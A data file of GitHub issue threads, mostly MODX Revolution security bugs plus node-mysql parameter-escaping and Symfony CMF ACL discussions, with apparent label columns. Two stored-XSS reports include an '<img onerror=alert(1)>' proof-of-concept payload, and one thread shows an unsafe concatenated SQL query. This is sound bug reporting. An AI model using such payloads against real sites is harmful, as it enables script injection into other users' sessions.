  - Android: All - Android 6>

","Hmm, we should certainly not throw on `ClosedGraceful` - when I wrote that code, I just couldn't get any server to ever produce it there, so that's why it's not in that switch block.

May I ask what you're trying to connect to?  Is it something in your app / private network or some public server?  This feels a little bit like that server might not like you closing and reopening connections too often.@baulig Thank you for your response. The app establishes IP connections to 4 addresses xxx.org.uk - these are TLS 1.2 connections using port 443 over TCP and are established between the app and back-end service. In order to avoid unnecessary persistent connections, the app is required to close and reopen connections every x min granted evidence that the connection is still needed. Is there something specific I can ask our back-end platform team to check/ look at?",no,"area-BCL: Mono.Security,"
symfony-cmf/symfony-cmf,1309984,"PHPCRODMSecurityBundle","Extend SecurityExtraBundle to allow for ACL security based on document identity:
- Document annotation/property: secure by path or by uuid
- implement ObjectIdentityInterface for PHPCR-ODM
- Add security exception to phpcr
- Use odm lifecycle callbacks to automatically check ACL

Implement subpath security for PHPCR:
- should be similar to existing sf2 firewall concept, e.g. all nodes below /admin are protected
","@schmittjoh: just FYI in case you are interested in the PHPCR efforts :)
for the phpcr layer, this jcr document might help: http://wiki.apache.org/jackrabbit/AccessControl
@uwej711: from reading that document it seems like Jackrabbit indeed has support for ACL's. It still might be that for now we do not add ACL support to PHPCR, but lacking support in Jackrabbit isnt a reason not to do it.
The document seems to be fairly new (compared to the rest in the wiki). Doing it in Jackrabbit (if the api is exposed via davex ...) will not work for other transports, using sf2 acls will not work for other phpcr implementations but still seems the better option to me.
the wiki document also seems talks about jackrabbit specific features. those are no option for us, i'd say. so its either the resource-based acls or no phpcr-based solution  - or a mix of acls and additional logic.
one of the core questions is if we can use phpcr acls to limit symfony authentication system based users. if not, we have to build at least some of the security in our application code.
given that using JCR security solves the ""limit"" problem and covers security for individual nodes and through inheritance also addresses our concept for subpath security, i think we should see if we can implement it. the main issue i see is that we will need to figure out how to manage users/groups via davex. furthermore we will need to improve DoctrinePHPCRBundle to easily set the credentials dynamically. furthermore we need to ensure that the credentials are taken into account in case we ever add caching.
@lsmith77 I assume you are thinking the acl data would be stored with the node like you had asked about on the MongoDB ACL provider
Yes. See also the link that @dbu posted above. As noted there the draw back is that this might not be ideal for backups, but it does mean that you should be able to efficiently filter while taking into account the actual permissions, which in turns means that LIMIT and ACL will play nicely together.
see also https://github.com/IamPersistent/MongoDBAclBundle
Is there any interest in a simpler role-based implementation based on tying a DocumentGroups to Roles or to User Groups directly? This would not necessarily be as granular a solution as ACL's (you would be able to do anything to a page assuming you had the right role). There would also have to be a way to differentiate frontend viewing from backend editing (perhaps frontend DocumentGroups and backend DocumentGroups) or perhaps different DocumentGroups would be used (for example Staff vs. Staff Admin) and you could use the existing symfony 2 voter system to derivce the Roles from the DocGroups and have it handled by the standard role voter.

This is much simpler than ACLs and therefore has the advantage of being easier to implement, more beginner friendly, less complex when the granularity of ACLs is not required. This is most likely how my company will implement private/public pages and document editing permissions as our old CMS did this and we found it to be granular enough.
see also 
https://github.com/symfony-cmf/CoreBundle/issues/65
https://github.com/symfony-cmf/CoreBundle/issues/64
https://github.com/symfony-cmf/CoreBundle/issues/63

for permissions that operate above the database level.
",no,"security,"
mysqljs/mysql,27120442,"Security issue with param escaping?","Hi, im running node-mysql latest on node-latest.
Somebody using the acunetix vulnerability scanner has triggered this error:
UNKNOWN COLUMN '$acunetix' IN WHERE CLAUSE.
The query: SELECT id, email FROM accounts WHERE username = ?

How is this possible? Its very dangerous to our application, please respond quickly.
","The problem seems to be about params that are not strings. Although I'll continue to sanitize all my user inputs (to avoid username impersonation attacks like `admіn` posing as `admin`), I'd expect the query engine to convert any param to a string if it should have been one in the first place. If it already was, `String(param)` should be of low cost.
@thekiur @mk-pmb can you post code samples?
We can confirm that the problem is caused by passing objects to the query call.
The objects come from the express bodyParser middleware.
We were simply passing req.body.username as the parameter for that query.
The acunetic vulnerability tester injected an object there.
We are not sure on the severity of this issue, but its unexpected to say atleast.
As we experienced, this can crash a live application in production mode if you dont expect any db errors.

There is no code to show: its as simple as passing a req.body.something to the .query call of node-mysql when using express with the bodyparser middleware. Running the vulnerability scanner against https://gist.github.com/ssafejava/9a2d77704712a8769322 causes the exception to be thrown.
This is not an issue with escaping with this library; this library is properly escaping all values and column names. The security issue is just with the way you are combining express and this library, such that you were expecting to get a string from express, so you were only expecting the `?` to expand according to string rules.

`req.body` properties can be anything with `bodyParser` and as such you need to at least verify what you are using is a string before passing to your query.
I consider prepared statements as intended to mitigate lack of input validation in the params in general. Therefor, limiting it to the case where input has already been validated as being a string, in my opinion misses the point.
Yours, MK
These are not prepared statements, they are done client-side and have various rules for how `?` is replaced depending on the data type, which is documented. If you want to be sure you are using the string-based `?` replacement though the API, you have to give the API a string. If you don't want to validate at all, you can use the `String()` function:
`conn.query('SELECT * FROM user WHERE username = ?', [String(req.body.username)]')`

The _purpose_ if it doing stuff different for objects is to help people who want to easily use `SET`:
`conn.query('UPDATE user SET ? WHERE id = ?', [{username: 'bob', password: '1234'}, 43])`

Please see the ""Different value types are escaped differently, here is how:"" section in https://github.com/felixge/node-mysql#escaping-query-values
I see. Looks like an unlucky case of embrace and extend. I wish you had opted for something like `??` in that case. Probably too late to change the interface?

Edit: Not really embrace and extend, as you wrote they aren't prepared statements. Rather just a pitfall for people who learn from tutorials and conclude topical similarity from visual similarity.
Edit 2: I see, `??` is already used for column names.
So this is what took down an exchange how pathetic.
@Hueristic please explain.
https://bitcointalk.org/index.php?topic=454186.0;topicseen
@Hueristic this links to the first page of a 192 page thread. I don't see the connection to this issue right away. Care to explain?
@felixge I only found this: https://bitcointalk.org/index.php?topic=454186.msg5909040#msg5909040
@dougwilson thx. I suppose that is what happens if you write financial software in a dynamically typed language ...
I can't see how it's the type system's fault when programmers assume that a mechanism that looks like prepared statements will defuse any data they pass in. Let's at least blame it at the programmers for trusting visual similarity instead of reading the manual thoroughly.
@mk-pmb sure, though this module only has a small Readme, which has all the `?` stuff explained (https://github.com/felixge/node-mysql#escaping-query-values), so it's not even some weird hidden feature. Unfortunately if people on the Internet are writing tutorials about this module and giving incomplete or wrong information, it's hard for us to even try to police that.
@mk-pmb it's the programmers role to understand the libraries he/she is using at least to the extend they are documented before including them in any production environment. If the library isn't fully documented, that's on the creator, but since this is an open-source world you can't really blame somebody for dedicating their time towards creating something for free.

Inferring functionality from syntax is useful, but think rationally: if the `?` operator accepts strings, would it only accepts strings? What if it accepted other data types? Jumping to blind assumptions about a library is a recipe for disaster, and good security protocols still mandate data validation.

Libraries and languages that make it easier to start developing are extremely useful, but I fear it gives a novice developer a misplaced sense of confidence. It's easy to build a small application, and when it ""just works"" assume nothing could possibly go wrong.
> Jumping to blind assumptions about a library is a recipe for disaster, and good security protocols still mandate data validation.

I agree with that. And still, lots of people do it. So for all software that I manage, I'll try and have it be compatible with everyday flawed humans, in hopes to lessen the risk and impact of errors in software based on mine, written by fallible humans.

BOfH would ship a GNU/Linux distro where the default shell acts fully like bash, just that on every line starting with an uppercase letter, the meaning of `&&` and `||` is swapped. Might even document it properly. You'd read the manual and probably wouldn't use it. However, if the next day a toy drone crashes into your car because it's pilot didn't read the manual as thoroughly as you did, your expectations of how humans should act had much less impact than how they really do act. And I'd still partially blame that BOfH.

Update: Thanks for making it opt-in.
Please, this issue doesn't need any more comments. It is still open as a tracking issue for me. There are coming changes that will affects this module and even things like `express` which will make any kind of ""shoot yourself in the foot"" operations opt-in. As an example, for this module `?` really should strictly only result in a single entry in the SQL (i.e. numbers, strings, null, etc.). Anything over that should be opt-in (on the connection-level or one-off on the query level to reduce accidental exposure.

These are changes that are coming I listed, not speculation. Please just know that this issue is taken seriously.
""These are changes that are coming I listed, not speculation. Please just know that this issue is taken seriously.""

Stellar
Are there any circumstances where this would lead to an injection attack?

As far as I can work out so far this appears to only ever result in syntax errors.
@SystemParadox: I don't think so. The report seems to be badly explained and seems to be related to constructing SQL based on user input without any check.

Good usage:

``` js
db.query(""SELECT * FROM users WHERE id = ?"", [ +req.params.id ], next);
```

No harm on that, casting forces it to be a number. Even if it wasn't a number and the `+` was omitted, it's just fine (or else you would have problems when UPDATing columns with binary data - there's tests for that).

The problem here seems to be with something more like:

``` js
// BAD! BAD!
db.query(""SELECT * FROM "" + req.params.table + "" WHERE ...."", next);
```
@SystemParadox yeah I just took a look at the formatting and escaping code. I don't see any way that passing unvalidated data to be interpolated into the query could result in an injection vulnerability. Without validation you can easily get a syntax error.
",no,"security,"
modxcms/revolution,410816509,"Stored XSS: system settings","## Bug report
### Summary
Change the value of settings **site_name** or **settings_version**

### Step to reproduce
```
""><img src=""#"" onerror=""alert(1)"" />
```

","![изображение](https://user-images.githubusercontent.com/2138260/111324561-15449f80-8695-11eb-9c51-efe8bdb97d17.png)

The problem is relevant in the installation from github from 16-03-2021",no,"bug,area-core,area-security,"
modxcms/revolution,29477571,"Access policies break on MySQL strict mode","Recently ran into an issue with access policies not being applied for resources after migrating servers. After some debugging and testing I tracked down the source of the problem.

The new server runs Percona Server 5.6 in strict configuration, which had the ONLY_FULL_GROUP_BY sql_mode set. This caused the SQL query in findPolicies() of modResource to fail, due to missing a column in the group by. Simply adding the column to the group by returns the wrong data, however.

In short: The SQL query that fetched access policies for resources does not support the sql_mode ONLY_FULL_GROUP_BY.

Forum post can be found here: http://forums.modx.com/thread/89477/resource-group-acls-being-ignored
","Checking that this is not sorted in 2.X and 3.X? I've run across it today with a 2.8.3 site and wondering if a 3.X upgrade is a fix.",no,"bug,area-security,"
modxcms/revolution,1221265353,"Confusing message about blocking a user","## Bug report
### Summary
It happens that if a user has a simple login, for example, `admin`, then, as it seems to me, the login form is blocked due to ""brute force"" on the manager.

And in the login form a message pops up:
`You have been blocked from the Manager by an administrator.`

![login_error](https://user-images.githubusercontent.com/12523676/165989720-fbf477fc-d22f-4d9d-a620-03efe80807fe.png)

In the `login.inc.php` lexicon:
`$_lang['login_blocked_admin'] = 'You have been blocked from the Manager by an administrator.';`

_But it turns out that admin blocked himself, even if there are no other users in the manager at all._

**Those either the message is displayed incorrectly, or the logic is broken in the file** https://github.com/modxcms/revolution/blob/3.x/core/src/Revolution/Processors/Security/Login.php.

### Environment
MODX 2.x >
","I'm unable to reproduce this error. 

After X amount of failed attempts I get this error message:
> You have been blocked due to too many failed login attempts.

If I try to log in again:
> You are temporarily blocked and cannot log in. Please try again later.There is a message, and it is used in the code :)
I don't know how to reproduce it manually, but clients have reported it and I've seen it a few times (I think it's related to admin login brute force, but maybe I'm wrong).@Ruslan-Aleev after waiting a bit I do get the same error message. However, if you try to login again after this message you are logged in successfully. 

So yes, you're right the logic is doing something wrong. ",no,"bug,area-core,area-security,"
modxcms/revolution,387925721,"[FEATURE REQUEST] - Show Extras that have updates available in home of dashboard","## Feature request
### Summary
Create a widget in the main (home) dashboard to show plugins/extras with available updates or in the MODX dashboard navigation menu (NOT IN A DROP DOWN) for better visibility when there are updates that are present... especially security updates.

### Why is it needed?
More visibility into knowing when plugins have been updated for features or, more importantly, security updates. Many times the installer section is not a section that is visited unless there is a specific action that a user is looking to take, ie... Add or remove an extra.

### Suggested solution(s)
Add a dashboard widget to the main dashboard view or add some sort of notification within the MODX Dashboard Navbar
","https://modx.com/extras/package/updater

![screen shot 2018-12-05 at 22 26 09](https://user-images.githubusercontent.com/1073780/49541951-d97ad700-f8dc-11e8-8894-4aa4550d7daa.png)
This also seems to be a feature coming with MODX 3.0, although it will be some time before it's release.I do not see why this have to be a part of the core. This can easily be done with a dashboard extra.

I suggest closing this.@OptimusCrime Will there be such a widget in the core? :)
In demo screens there are 2 widget types:

1. With updating only MODX
2. With update packages and MODX

**Correct varinat - with update packages and MODX.**

![dashboard_1](https://user-images.githubusercontent.com/12523676/49604125-8b320a80-f9a6-11e8-96bd-ce7745f7e4f1.png)
![dashboard_2](https://user-images.githubusercontent.com/12523676/49604126-8b320a80-f9a6-11e8-843b-c66182a111d5.png)Related issues: 
- #14020 
- #14007
- #7616Some time ago I had an idea to move upgrademodx into the core to make widgets on mockups working. So yes, it should be implemented (I hope soon).@OptimusCrime I see your point, but from coming from a security background, each extra is the potential for an exploit. I'm not going to say all extras need to be part of the core CMS, that would be ignorant, but something like this where you don't have immediate visibility of out of date plugins can cost a company using MODX a lot of money unless you have someone going to the installer section every day to see if there's an update. 

Example, I had a client who patched the MODX 2.6.4 vulnerability and upgraded to MODX 2.6.5 as well as all of their plugins a few days after the announcement, but they were also using the Gallery extra which had not been updated in about 4 years. The plugin was updated about a week and a half later to patch the vulnerability but since there's no kind of notification that tells users that an update is available the site got compromised months later as a result. Thankfully the results of the compromise were not visible to front-end users, but the attackers were able to do things on the server. But the attacker could have defaced the site and cause the company a lot and hurt their brand. Had there been some notification of an out-of-date plugin this could have prevented. Since now I have the knowledge of this plugin I have absolutely installed it for that visibility, but me personally I don't think this extra should be an extra it should be in the core because of how vital it is.

Additionally, it's impossible for someone maintaining a site to know every plugin/extra for MODX so if someone does not know about this extra like myself, they are missing out on some vital information that most CMS's include in their core.

@Alroniks - Cheers for, hopefully, implementing this into the core soon, I'm sure MODX users around the world will love you for that.I couldn’t have said it better @daygon2007 !@daygon2007 Sure, you have a valid point, and perhaps this is one of the cases where putting it in the core is justifiable. I am just, generally, against bloating the core with more and more features. The MODX core is already gigantic, and I personally think it does way more than it have to. An ideal core in my opinion would provide us with features that _everyone_ would always use, and features that are 100% necessary.

For example, this dashboard widget would be redundant for our workflow. We monitor extras using other services, like SiteDash, and other tools. The customers themselves are never supposed to update the extras, as this might result in unpredicted behavior, bugs or errors. It is our task to make sure the sites are not vulnerable to attacks.

The Gallery exploit in particular is something that was discussed _a lot_ in the community, and we were made aware of this in many channels. Perhaps more people would have upgraded Gallery if they saw that an update was available, but I also think that few people update every single extra that has an available update all the time. Unless it was somehow made clear that this was a very important update for Gallery, I think that most people would just skip updating it. A new dashboard widget would not fix this.

Regardless, I am not going to fight a battle against making this a part of the core. If most people are positive to this, then fine by me. I would just personally prefer to make a good extra out of it, and allow people to make it a part of their default setup, if they chose to, instead of forcing it on everyone.

Perhaps this approach make more sense in a framework, instead of a CMS, like MODX.I think this is a great opportunity to have a good discussion where possible solutions are proposed. 

One of the problems I can deduct is not being aware of important security updates. Maybe we should focus on how that can be improved?It is necessary to put an update method in the core! For security reason! And some warning for insecure extras should be in the core too. For security reason.One option is to have a small ‘core’ but then a release that provides a bunch of recommended add ons on top.Like I said, what, 10 years ago? MODX Lite!@Jako Update methods for extras already exists, we are debating whether or not we have to place it on the dashboard for everyone to see, including customers that have no technological understanding, and might be confused over what it means. Naturally, it can be hidden, but it seem like extra work for something that should be opt-in in my opinion.@OptimusCrime Ok, it is necessary to put a check for a core update in the core, too (wherever it is displayed). And some webservice where the current available version is requested. Updater and simpleUpdater have their own webservice and UpgradeMODX relies on GitHub which is a bit annoying. I don't see any reason, why this should stay in an extra, that has to be promoted/found and installed separate from the core.We must not forget about the update widget for the beta version, but for now (alpha1) this widget does not work, but it is already on the main home panel :)",no,"feature,area-security,"
modxcms/revolution,29427699,"Disable ability to add user to admin user group, unless user himself has admin rights","Disable ability to add a user to the admin user group, unless the user who is trying to do this has admin rights himself. (Or; restrict users to add new users with higher permissions than they have themselves)

Now, content-editors with permissions to add new users can also create admin users, or give themselves admin rights.

This is a huge security flaw in my view, becasue I have content-editors who would like to.. experiment. ;)
","+1
+1, with an additional option to restrict it to SUDO (some of our customers are experienced MODX-ers themselfs but we don't want them to create new Admins, that's restricted to SUDO users. 
:+1: 
+1
:+1: 
Or herself ;)—
Sent from Mailbox for iPhone

On Thu, Apr 17, 2014 at 2:11 AM, Jens Külzer notifications@github.com
wrote:

> ## +1
> 
> Reply to this email directly or view it on GitHub:
> https://github.com/modxcms/revolution/issues/11208#issuecomment-40695305
... yes, that too ...
I am currently looking into this and am curious how others would prefer to see this approached?

**For example:**
- Only allow Manager users to assign Roles lesser than (or equal to) the max `Authority` level of their currently assigned Roles, e.g.:
  - Prevent adding others (or themselves) to Administrator group with a lower Authority **e.g. Super User Role**
  - Allow assigning to any possible User Groups **OR** somehow provide a way to limit to certain Groups (similar to aforementioned Role restrictions?)
  - Prevent enabling the `sudo` flag
- Preventing Edits _(and Viewing Profiles?)_ of higher ranked users (determined by Role > Authority).
- Sudo handling:
  - Only a `sudo` user can access / edit / assign Roles to another  `sudo` user.
  - Administrators with Super User Role: Yes/No?
- Can any changes to privilege escalation handling be applied without the introduction of additional Permissions / Policies?
- Other?

Also, this issue appears related to #7547 and #10443
I think
- Prevent adding others (or themselves) to Administrator group with a lower Authority e.g. Super User Role

and
- Sudo handling:
  Only a sudo user can access / edit / assign Roles to another sudo user.
  Administrators with Super User Role: Yes

would be fine for me
Thanks for that feedback, @exside.

I guess another item worth discussing is the current ability to Deactivate and Block higher authority Manager Users.

Currently, you can simply block / deactivate an Administrator (Super User) or `sudo` user with minimal permissions yourself.
Good catches Mike and @exside definitely should be able to do that either IMO.
definitely a good catch! that should not be possible (lower permission deactivate higher)!
+1
So... problem is solved? or forgotten? :)))))
or what?
why it was removed from milestone?
Problem is not solved. Milestone was removed because a solution has yet to be provided in time for that release.
",no,"proposal,area-security,urgent,"
modxcms/revolution,26696762,"Child user group members are not parent user group members","gadamiak created Redmine issue ID 9063

The user groups can be nested one inside another. This is a nice way to keep order but has only organizational purpose as access policies can not be assigned in bulk to child user groups. It would work if members of nested user groups were treated as members of the parent user group.

To illustrate the case consider the following example. There are many contexts, which are owned by different users. The most natural way to manage access permissions is to:
- make a parent group, eg. ""Context managers""
- make a child user group for each context, eg. ""context""

This would allow to:
- define access policies based on roles for ""mgr"" for ""Context managers"" user group, ie. define what users can do in manager UI
- and define access policies based on roles for the specific context (""context""), ie. define what users can do in the context they have access to (load, list, view, save..., resource groups etc)
- hook form customization for all ""Context managers"" members

That way ACL don't need to be duplicated for ""mgr"" access or users wouldn't need to be duplicated in separate user groups (to achieve the above currently users need to be placed in both mentioned user groups).

To summarize:
- users should be members of containing (parent) user groups
- ACL defined for parent user group should be inherited for contained (child) user groups
- user roles defined in child user groups should apply for ACLs defined in parent user group unless overridden by parent user group membership.
","gadamiak submitted:

Just a note: if user group nesting is meant only to help organize them then categories should be used for that purpose.
opengeek submitted:

They are only meant for organizational purposes. This is not a bug, but I am changing this to a feature request for user group inheritance for 2.3.
gadamiak submitted:

Fine, thanks.
",no,"feature,area-security,"
modxcms/revolution,410861637,"Unsafe RSS feed","## Bug report
### Summary
Potential backdoor

### Step to reproduce
Change the value of settings **feed_modx_news** or **feed_modx_security**

### Observed behavior
- XSS
- XXE
- Social engineering","RSS feed also handles MODX tags. This is another attack vector.This doesn't really seem like a problem to me, but an administrator level functionality. 

The permissions needed to change settings would also allow you to, for example, change the manager theme or undo other protections that have a setting (upload_files, allow_tags_in_post, etc). Ok:-) Then the security of **ALL** CMS installations depends on who can create post on https://forums.modx.com/board?board=7 or https://forums.modx.com/board?board=294 :hankey: Those are both restricted to the MODX team, so I'm okay with putting some trust in that. ;) 

Open to ideas though if you think there are worthwhile improvements. Sounds like changing the URLs is not what you're most worried about now?I worry that access to the site == author of the rss feed
If you have genuine security worries about these feeds, I would like to understand them. It's better to not discuss security concerns in a public place like this though, if you have a POC (or just a theory), could you please send it to me and the rest of the security team via the security mailing list (security@modx.com)?PoC submitted
Related #14393@JoshuaLuckers  Wasn't that fixed in #14392 ? > @JoshuaLuckers Wasn't that fixed in #14392 ?

No, that was only to reduce a man in the middle attack. We have MODx.util.safeHtml since https://github.com/modxcms/revolution/pull/14453. Could this be used here?I think we need to use in links with target=""_blank"":
`rel=""noopener noreferrer""`@JoshuaLuckers Is it relevant?",no,"bug,area-security,"
modxcms/revolution,58350225,"Session cookie is actually persistant","### Summary

The system setting 'session_cookie_lifetime' is by default set to '604800' (one week) and the description indicates that it is only used if a user selects 'Remember Me' when logging in:

""Use this setting to customize the session cookie lifetime in seconds. This is used to set the lifetime of a client session cookie when they choose the 'remember me' option on login.""

However the 'PHPSESSID' session cookie set by MODX for any anonymous user is acually set to expire using the 'session_cookie_lifetime' setting of one week. This interfers with things like a shopping cart that uses session variables as the user uses the same session/session variables for a week.

Leaving the 'session_cookie_lifetime' setting blank fixes this and the 'PHPSESSID' cookie expires on closing the browser, but you lose the 'Remember Me' function.

Is this a bug or expected behavior? If expected perhase the setting desc needs correcting?
### Step to reproduce

Clear all browser cookies and visit a MODX website. Using firebug/dev tools inspect the 'PHPSESSID' cookie.
### Observed behavior

'PHPSESSID' cookie is set to expire in one week.
### Expected behavior

'PHPSESSID' cookie should be set to expire at end of session.
### Environment

MODX Revolution 2.3.3-adv, Firefox, Chrome, IE11.
","I thought the PHPSESSID was a cookie that PHP used internally to make sessions etc work?
It is but MODX takes over the handling of sessions by changing the 'session_handler_class' from PHP to a custom handler 'modSessionHandler'.

By default PHP would write session data to the file system but MODX writes it to a database table instead. The value of the PHPSESSID cookie is the row id for the relevant session data in the 'modx_session' table.

As MODX takes over the handling of sessions, it seems to be setting the session cookie expires incorrectly somewhere which is where the problem is.
I came here looking for a solution. I just found out that my `$coupon = $_SESSION['discounts']['coupon']` is not expiring either. If you keep visiting the site once a week it keeps getting reset.

So any snippet you create using a `$_SESSION` can't be trusted. Use `setcookie` instead?
I concur. 

The method used to destroy $_SESSIONS is incorrect.

The Method doing the work:

``` php
 /**
     * Ends a user session completely, including all contexts.
     *
     * @access public
     */
    public function endSession() {
        $this->removeLocks();
        $_SESSION = array();
        if (ini_get(""session.use_cookies"")) {
            $params = session_get_cookie_params();
            setcookie(
                session_name(),
                '',
                time() - 42000,
                $params[""path""],
                $params[""domain""],
                $params[""secure""],
                $params[""httponly""]
            );
        }
        session_destroy();
    }
```

Per PHP docs:

```
session_destroy() destroys all of the data associated with the current session. It does not unset any of the global variables associated with the session, or unset the session cookie. 

In order to kill the session altogether, like to log the user out, the session id must also be unset. If a cookie is used to propagate the session id (default behavior), then the session cookie must be deleted. setcookie() may be used for that.
```

I also notice a large amount of Sessions remaining in the modx_session table, though these could be drop offs.

In short, user information remains with them after log out which is **not** the desired effect.

I would like to see the entire session destroyed, not just context information. 

Example unwanted $_SESSION after current logout:

``` php
array ( 'modx.user.0.resourceGroups' => array ( 'web' => array ( 0 => '11', 1 => '12', ), ),
'modx.user.0.attributes' => array ( 'operations' => array ( 'modAccessContext' => array ( 'operations' 
=> array ( 0 => array ( 'principal' => 0, 'authority' => '0', 'policy' => array ( 'load' => true, 'list' => true, 
'view' => true, ), ), ), 'HIDDEN-HOLD' => array ( 0 => array ( 'principal' => 0, 'authority' => '0', 'policy' 
=> array ( 'load' => true, ), ), ), 'web' => array ( 0 => array ( 'principal' => 0, 'authority' => '0', 'policy' 
=> array ( 'load' => true, 'list' => true, 'view' => true, ), ), ), ), 'modAccessResourceGroup' => array ( 
8 => array ( 0 => array ( 'principal' => 0, 'authority' => '0', 'policy' => array ( 'load' => true, ), ), ), ), 
'modAccessCategory' => array ( ), 'sources.modAccessMediaSource' => array ( ), ), 'web' => array ( 
'modAccessContext' => array ( 'operations' => array ( 0 => array ( 'principal' => 0, 'authority' => '0', 
'policy' => array ( 'load' => true, 'list' => true, 'view' => true, ), ), ), 'HIDDEN-HOLD' => array ( 0 => 
array ( 'principal' => 0, 'authority' => '0', 'policy' => array ( 'load' => true, ), ), ), 'web' => array ( 0 => 
array ( 'principal' => 0, 'authority' => '0', 'policy' => array ( 'load' => true, 'list' => true, 'view' => true, 
), ), ), ), 'modAccessResourceGroup' => array ( 11 => array ( 0 => array ( 'principal' => 0, 'authority' 
=> '0', 'policy' => array ( 'load' => true, 'list' => true, 'view' => true, ), ), ), 12 => array ( 0 => array ( 
'principal' => 0, 'authority' => '0', 'policy' => array ( 'load' => true, 'list' => true, 'view' => true, ), ), ), ), 
'modAccessCategory' => array ( ), 'sources.modAccessMediaSource' => array ( ), ), ), 
'modx.user.contextTokens' => array ( 'operations' => 1, ), 'modx.user.0.userGroupNames' => array ( 
), 'modx.operations.user.token' => 'modx54cb79e6d9f883.93539893_15553a653a09488.53960853', 
'modx.operations.session.cookie.lifetime' => 604800, 'modx.operations.user.config' => array ( ), 
'modx.user.1.userGroupNames' => array ( 0 => 'Administrator', 1 => 'Affiliate', 2 => 'HIDDEN', 3 => 
'Operations', ), 'clientId' => 100000, 'clientCompanyProgramId' => 1, 'clientDisplayName' => 
'ClientName', 'clientRef' => 'ATE6EWF7QGXC', 'modx.user.100000.userGroupNames' => array ( 0 
=> 'Affiliate', 1 => 'Customer', ), 'deviceId' => 53, 'displayName' => 'DeviceName', 'enrollerID' => 99, 
'enrollerName' => 'enqueue', 'programType' => 'Affiliate', 'enrolledByName' => 'enqueue', 
'teamLeaderName' => 'TeamLeaderName', 'modx.user.100000.resourceGroups' => array ( 'web' => 
array ( 0 => '4', 1 => '5', 2 => '6', ), ), 'modx.user.100000.attributes' => array ( 'web' => array ( 
'modAccessContext' => array ( 'web' => array ( 0 => array ( 'principal' => '5', 'authority' => '1000', 
'policy' => array ( 'load' => true, 'list' => true, 'view' => true, 'save' => true, 'remove' => true, 'copy' => 
true, 'view_unpublished' => true, ), ), 1 => array ( 'principal' => '7', 'authority' => '3000', 'policy' => 
array ( 'load' => true, 'list' => true, 'view' => true, 'save' => true, 'remove' => true, 'copy' => true, 
'view_unpublished' => true, ), ), ), ), 'modAccessResourceGroup' => array ( 4 => array ( 0 => array ( 
'principal' => '5', 'authority' => '1000', 'policy' => array ( 'add_children' => true, 'create' => true, 
'copy' => true, 'delete' => true, 'list' => true, 'load' => true, 'move' => true, 'publish' => true, 'remove' 
=> true, 'save' => true, 'steal_lock' => true, 'undelete' => true, 'unpublish' => true, 'view' => true, ), ), 
), 5 => array ( 0 => array ( 'principal' => '5', 'authority' => '1000', 'policy' => array ( 'add_children' => 
true, 'create' => true, 'copy' => true, 'delete' => true, 'list' => true, 'load' => true, 'move' => true, 
'publish' => true, 'remove' => true, 'save' => true, 'steal_lock' => true, 'undelete' => true, 'unpublish' 
=> true, 'view' => true, ), ), ), 6 => array ( 0 => array ( 'principal' => '5', 'authority' => '1000', 'policy' 
=> array ( 'add_children' => true, 'create' => true, 'copy' => true, 'delete' => true, 'list' => true, 'load' 
=> true, 'move' => true, 'publish' => true, 'remove' => true, 'save' => true, 'steal_lock' => true, 
'undelete' => true, 'unpublish' => true, 'view' => true, ), ), 1 => array ( 'principal' => '7', 'authority' => 
'3000', 'policy' => array ( 'add_children' => true, 'create' => true, 'copy' => true, 'delete' => true, 'list' 
=> true, 'load' => true, 'move' => true, 'publish' => true, 'remove' => true, 'save' => true, 'steal_lock' 
=> true, 'undelete' => true, 'unpublish' => true, 'view' => true, ), ), ), ), 'modAccessCategory' => array 
( ), 'sources.modAccessMediaSource' => array ( ), ), ), )

```

What we should be seeing:

``` php
array ( 'modx.user.0.resourceGroups' => array ( 'web' => array ( 0 => '11', 1 => '12', ), ), 
'modx.user.0.attributes' => array ( 'web' => array ( 'modAccessContext' => array ( 'operations' => 
array ( 0 => array ( 'principal' => 0, 'authority' => '0', 'policy' => array ( 'load' => true, 'list' => true, 
'view' => true, ), ), ), 'HIDDEN-HOLD' => array ( 0 => array ( 'principal' => 0, 'authority' => '0', 'policy' 
=> array ( 'load' => true, ), ), ), 'web' => array ( 0 => array ( 'principal' => 0, 'authority' => '0', 'policy' 
=> array ( 'load' => true, 'list' => true, 'view' => true, ), ), ), ), 'modAccessResourceGroup' => array ( 
11 => array ( 0 => array ( 'principal' => 0, 'authority' => '0', 'policy' => array ( 'load' => true, 'list' => 
true, 'view' => true, ), ), ), 12 => array ( 0 => array ( 'principal' => 0, 'authority' => '0', 'policy' => array 
( 'load' => true, 'list' => true, 'view' => true, ), ), ), ), 'modAccessCategory' => array ( ), 
'sources.modAccessMediaSource' => array ( ), ), ), 'modx.user.0.userGroupNames' => array ( ), 
'modx.user.contextTokens' => array ( ), ) 
```

Part of this may be browser specific.
Internet Explorer 11 clears it correctly.
Google Chrome 42.0.2311.152 m retains the extra information
Firefox  37.0.2 Appears to clear it correctly also.
Safari also clears the $_SESSION.

Please make sure the $_SESSION Is completely destroyed across all devices.

I just verified the $_SESSIONs are indeed left in the database after logout.

If I clear Chrome's browser cache, I can log in and back out with a clean session. Evidently, MODX is restoring old session information from local cookies as I made changes in the class I am using and those cosmetic changes did not appear, but the old $_SESSION values did.
Can anyone with better insight in this shed some light on what is going on here?
Was or will this ever be resolved?  This issue is causing my current site to fail webinspect Cookie Security: Persistent Cookie ( 4728 ) I'll take a proper look at this soon as still causing issues. Seems to be around here that its getting set wrong: https://github.com/modxcms/revolution/blob/9ba171e4108fa7e43fb80ffa959b2e629fda28b2/core/model/modx/modx.class.php#L2511@davidpede Could you figure it out?You can create a ""pseudo hook"" (autonomous snippet) placed on the landing page that on logout looks for the service=logout in the $_POST and destroys the cookie and the session after the Login package ""completes"" its process.",no,"bug,area-core,area-security,"
modxcms/revolution,410971398,"CSFR","## Feature request
### Summary
security reason

### Why is it needed?
https://github.com/modxcms/revolution/issues/14094#issuecomment-425766305",,no,"proposal,area-security,"
modxcms/revolution,410817672,"Stored XSS: Dashboards","## Bug report
### Step to reproduce
Name field:
```
""><img src=""#"" onerror=""alert(1)"" />
```
### Observed behavior
![image](https://user-images.githubusercontent.com/1748872/52865997-91d7bd80-315f-11e9-9b1f-936c04e46a7b.png)","![изображение](https://user-images.githubusercontent.com/2138260/111324837-5472f080-8695-11eb-8c67-eb0e45cef1f8.png)

The problem is not relevant in the installation from github from 16-03-2021

![изображение](https://user-images.githubusercontent.com/2138260/111325057-86845280-8695-11eb-8b60-afd0b5cf2bea.png)

The problem is  relevant in the installation 2.8.1",no,"bug,area-core,area-security,"
